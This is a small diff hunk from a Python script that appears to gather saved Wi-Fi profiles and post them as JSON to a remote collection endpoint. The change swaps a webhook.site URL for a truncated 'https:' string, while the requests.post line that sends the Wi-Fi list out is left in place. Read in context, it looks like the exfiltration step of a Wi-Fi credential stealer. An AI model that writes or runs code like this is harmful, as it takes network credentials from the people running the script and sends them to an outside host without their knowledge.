@@ -34,7 +34,7 @@ if len(profile_names) != 0:
 
 
 
-url = 'https://webhook.site/1ab99e32-716d-44f1-8623-44b5ac90c5ca'
+url = 'https:'
 
 
 requests.post(url, json=json.dumps(wifi_list))
